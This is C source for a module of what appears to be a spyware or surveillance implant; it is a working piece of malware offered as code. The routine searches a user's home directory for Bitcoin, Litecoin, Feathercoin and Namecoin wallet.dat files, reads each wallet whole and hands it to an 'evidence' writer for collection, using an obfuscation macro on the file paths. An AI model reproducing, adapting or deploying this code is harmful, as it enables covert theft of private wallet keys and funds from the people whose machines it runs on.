#define _GNU_SOURCE
#include <glob.h>
#include <openssl/bio.h>

#include "module.h"
#include "evidencemanager.h"
#include "me.h"
#include "so.h"
#include "bioutils.h"

#define EVIDENCE_VERSION 2014010101

#define BITCOIN_WALLET     0x00
#define LITECOIN_WALLET    0x30
#define FEATHERCOIN_WALLET 0x0e
#define NAMECOIN_WALLET    0x34

static void money_getwallet(int currency, char *path);

void *module_money_main(void *args)
{
   debugme("Module MONEY started\n");

   money_getwallet(BITCOIN_WALLET, SO"~/.bitcoin/wallet.dat");
   money_getwallet(LITECOIN_WALLET, SO"~/.litecoin/wallet.dat");
   money_getwallet(FEATHERCOIN_WALLET, SO"~/.feathercoin/wallet.dat");
   money_getwallet(NAMECOIN_WALLET, SO"~/.namecoin/wallet.dat");
   
   debugme("Module MONEY stopped\n");

   return NULL;
}

static void money_getwallet(int currency, char *path)
{
   BIO *bio_additional = NULL, *bio_data = NULL, *bio_file = NULL;
   long additionallen, datalen;
   char *additionalptr, *dataptr;
   int i;
   glob_t globbuf = {};
   int chunksize;
   char chunkbuf[4096];

   do {
      if(!(bio_additional = BIO_new(BIO_s_mem()))) break;
      if(!(bio_data = BIO_new(BIO_s_mem()))) break;

      if(glob(path, GLOB_NOSORT|GLOB_TILDE|GLOB_BRACE, NULL, &globbuf)) break;
      for(i = 0; i < globbuf.gl_pathc; i++) {
         BIO_reset(bio_additional);
         BIO_reset(bio_data);

         if(!(bio_file = BIO_new_file(globbuf.gl_pathv[i], "r"))) continue;
         while(!BIO_eof(bio_file)) {
            chunksize = BIO_read(bio_file, chunkbuf, sizeof(chunkbuf));
            BIO_write(bio_data, chunkbuf, chunksize);
         }
         BIO_free(bio_file);

         debugme("- MONEY wallet %s\n", globbuf.gl_pathv[i]);

         if(BIO_puti32(bio_additional, EVIDENCE_VERSION) == -1) continue;
         if(BIO_puti32(bio_additional, currency) == -1) continue;
         if(BIO_puti32(bio_additional, 0) == -1) continue;
         if(BIO_puts16p(bio_additional, globbuf.gl_pathv[i]) == -1) continue;
         if(!(additionallen = BIO_get_mem_data(bio_additional, &additionalptr))) continue;

         if((datalen = BIO_get_mem_data(bio_data, &dataptr))) evidence_write(EVIDENCE_TYPE_MONEY, additionalptr, additionallen, dataptr, datalen);
      }
   } while(0);
   globfree(&globbuf);
   if(bio_additional) BIO_free(bio_additional);
   if(bio_data) BIO_free(bio_data);

   return;
}
